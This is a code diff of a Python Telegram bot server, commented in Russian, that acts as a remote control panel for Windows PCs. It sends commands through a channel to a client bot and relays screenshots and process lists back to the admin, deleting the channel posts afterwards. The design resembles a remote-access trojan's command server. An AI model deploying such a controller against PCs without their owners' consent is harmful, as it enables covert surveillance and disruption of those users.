@@ -6,7 +6,7 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedIn
 from dotenv import load_dotenv
 
 load_dotenv()
-TOKEN = os.getenv("BOT_TOKEN") # Токен БОТА №1 (Сервер)
+TOKEN = os.getenv("BOT_TOKEN")  # Токен БОТА №1 (Сервер)
 ADMIN_ID = 5153650495  # Твой ID
 
 # ЮЗЕРНЕЙМ ТВОЕГО КАНАЛА БЕЗ СИМВОЛА @
@@ -23,39 +23,90 @@ def is_admin(user_id: int) -> bool:
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     if not is_admin(message.from_user.id): return
-    await message.answer("🤖 Пульт управления (Два бота через канал) готов.\n\n/devices — Список устройств")
+    await message.answer("🤖 Пульт администратора Windows (Два бота) готов.\n\n/devices — Открыть список устройств")
 
 @dp.message(Command("devices"))
 async def cmd_devices(message: types.Message):
     if not is_admin(message.from_user.id): return
     if not connected_pcs:
-        await message.answer("❌ Список устройств пуст. Ожидайте сигнал от клиента.")
+        await message.answer("❌ Список устройств пуст. Запустите клиент на целевом ПК.")
         return
+        
     keyboard = [[InlineKeyboardButton(text=f"💻 {info['name']}", callback_data=f"manage_{dev_id}")] for dev_id, info in connected_pcs.items()]
-    await message.answer("🎛 Выберите устройство:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
+    await message.answer("🎛 Выберите устройство для управления:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
 
 @dp.callback_query(F.data.startswith("manage_"))
 async def manage_device(callback: types.CallbackQuery):
     device_id = callback.data.split("_")[1]
     device_info = connected_pcs.get(device_id)
-    if not device_info: return
+    if not device_info:
+        await callback.answer("❌ Устройство оффлайн или не найдено.")
+        return
+        
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📸 Сделать скриншот", callback_data=f"cmd_screen_{device_id}")],
-        [InlineKeyboardButton(text="📋 Список процессов", callback_data=f"cmd_tasklist_{device_id}")],
-        [InlineKeyboardButton(text="🔒 Заблокировать экран", callback_data=f"cmd_lock_{device_id}")],
+        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
+        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
+        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
+        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
         [InlineKeyboardButton(text="⬅️ Назад к списку", callback_data="back_to_list")]
     ])
-    await callback.message.edit_text(text=f"💻 ПК: *{device_info['name']}*\n🆔 ID: `{device_id}`", parse_mode="Markdown", reply_markup=keyboard)
+    await callback.message.edit_text(text=f"💻 Управление ПК: *{device_info['name']}*\n🆔 ID: `{device_id}`", parse_mode="Markdown", reply_markup=keyboard)
+
+@dp.callback_query(F.data.startswith("cat_mon_"))
+async def cat_monitoring(callback: types.CallbackQuery):
+    dev_id = callback.data.split("_")[2]
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="1. 📸 Сделать скриншот", callback_data=f"cmd_screen_{dev_id}")],
+        [InlineKeyboardButton(text="2. 📋 Список процессов", callback_data=f"cmd_tasklist_{dev_id}")],
+        [InlineKeyboardButton(text="3. 🔊 Звук на максимум", callback_data=f"cmd_volmax_{dev_id}")],
+        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
+    ])
+    await callback.message.edit_text(text="📊 **Инфо и Мониторинг**", reply_markup=keyboard)
+
+@dp.callback_query(F.data.startswith("cat_sys_"))
+async def cat_system(callback: types.CallbackQuery):
+    dev_id = callback.data.split("_")[2]
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="4. 🔒 Заблокировать экран", callback_data=f"cmd_lock_{dev_id}")],
+        [InlineKeyboardButton(text="5. 🌙 В спящий режим", callback_data=f"cmd_sleep_{dev_id}")],
+        [InlineKeyboardButton(text="6. 🔄 Перезагрузить ПК", callback_data=f"cmd_reboot_{dev_id}")],
+        [InlineKeyboardButton(text="7. 🛑 Выключить ПК", callback_data=f"cmd_shutdown_{dev_id}")],
+        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
+    ])
+    await callback.message.edit_text(text="⚙️ **Системные действия**", reply_markup=keyboard)
+
+@dp.callback_query(F.data.startswith("cat_web_"))
+async def cat_web(callback: types.CallbackQuery):
+    dev_id = callback.data.split("_")[2]
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="8. 🌐 Открыть YouTube", callback_data=f"cmd_yt_{dev_id}")],
+        [InlineKeyboardButton(text="9. 🔍 Открыть Google", callback_data=f"cmd_google_{dev_id}")],
+        [InlineKeyboardButton(text="10. 🗺 Открыть Карты", callback_data=f"cmd_maps_{dev_id}")],
+        [InlineKeyboardButton(text="11. 💬 Вывести Сообщение", callback_data=f"cmd_msg_{dev_id}")],
+        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
+    ])
+    await callback.message.edit_text(text="🌐 **Открытие ресурсов и медиа**", reply_markup=keyboard)
+
+@dp.callback_query(F.data.startswith("cat_util_"))
+async def cat_utilities(callback: types.CallbackQuery):
+    dev_id = callback.data.split("_")[2]
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="12. 🧮 Запустить Калькулятор", callback_data=f"cmd_calc_{dev_id}")],
+        [InlineKeyboardButton(text="13. 📝 Запустить Блокнот", callback_data=f"cmd_notepad_{dev_id}")],
+        [InlineKeyboardButton(text="14. 🎨 Запустить Paint", callback_data=f"cmd_paint_{dev_id}")],
+        [InlineKeyboardButton(text="15. ⏳ Запустить Хранитель экрана", callback_data=f"cmd_scr_{dev_id}")],
+        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
+    ])
+    await callback.message.edit_text(text="🛠 **Запуск встроенных утилит**", reply_markup=keyboard)
 
 @dp.callback_query(F.data.startswith("cmd_"))
 async def send_command(callback: types.CallbackQuery):
     _, cmd_type, device_id = callback.data.split("_", 2)
     try:
-        # Бот №1 публикует команду в канал для клиента
         await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{cmd_type}")
         await callback.answer("🚀 Команда отправлена в канал!")
-    except:
-        await callback.answer("❌ Ошибка. Проверь, что Бот №1 админ в канале.")
+    except Exception as e:
+        await callback.answer("❌ Ошибка отправки в канал.")
 
 @dp.callback_query(F.data == "back_to_list")
 async def back_to_list(callback: types.CallbackQuery):
@@ -63,42 +114,43 @@ async def back_to_list(callback: types.CallbackQuery):
     await cmd_devices(callback.message)
 
 
-# --- БОТ №1 СЧИТЫВАЕТ ДАННЫЕ ИЗ КАНАЛА, КОТОРЫЕ КИДАЕТ БОТ №2 ---
+# --- ОБРАБОТКА ДАННЫХ ОТ БОТА №2 ИЗ КАНАЛА ---
 
 @dp.channel_post(F.text.startswith("PING:"))
 async def handle_channel_ping(message: types.Message):
-    """Ловим пинг от БОТА №2 из канала"""
     try:
         _, device_id, pc_name = message.text.split(":")
+        # Если устройства ещё нет в списке — шлем уведомление в личку
         if device_id not in connected_pcs:
             connected_pcs[device_id] = {"name": pc_name}
-            # Оповещаем тебя в личку о новом устройстве
             await bot.send_message(chat_id=ADMIN_ID, text=f"🔔 **ПК `{pc_name}` обнаружен онлайн через канал!**", parse_mode="Markdown")
-        await message.delete()  # Удаляем техническое сообщение, чтобы очистить канал
+        else:
+            # Если оно уже есть, просто тихо обновляем запись без отправки сообщения тебе
+            connected_pcs[device_id] = {"name": pc_name}
+            
+        await message.delete()  # Очищаем канал от технического поста
     except: pass
 
 @dp.channel_post(F.document & F.caption.startswith("SCREEN_REPLY:"))
 async def receive_channel_screenshot(message: types.Message):
-    """Ловим скриншот от БОТА №2 из канала и пересылаем тебе в личку"""
     try:
         device_id = message.caption.split(":")[1]
         pc_name = connected_pcs.get(device_id, {}).get("name", "Неизвестный ПК")
         file_buffer = await bot.download_file((await bot.get_file(message.document.file_id)).file_path)
-        await bot.send_photo(chat_id=ADMIN_ID, photo=BufferedInputFile(file_buffer.read(), filename="s.png"), caption=f"📸 Скриншот: *{pc_name}*", parse_mode="Markdown")
-        await message.delete()  # Удаляем из канала
+        await bot.send_photo(chat_id=ADMIN_ID, photo=BufferedInputFile(file_buffer.read(), filename="screenshot.png"), caption=f"📸 Скриншот с ПК: *{pc_name}*", parse_mode="Markdown")
+        await message.delete()
     except: pass
 
 @dp.channel_post(F.text.startswith("LOG_REPLY:"))
 async def receive_channel_log(message: types.Message):
-    """Ловим список процессов от БОТА №2 из канала и пересылаем тебе в личку"""
     try:
         text_data = message.text.replace("LOG_REPLY:", "")
         await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown")
-        await message.delete()  # Удаляем из канала
+        await message.delete()
     except: pass
 
 async def main():
-    print("[СЕРВЕР] Бот №1 запущен и слушает канал!")
+    print("[СЕРВЕР] Бот №1 готов к работе!")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
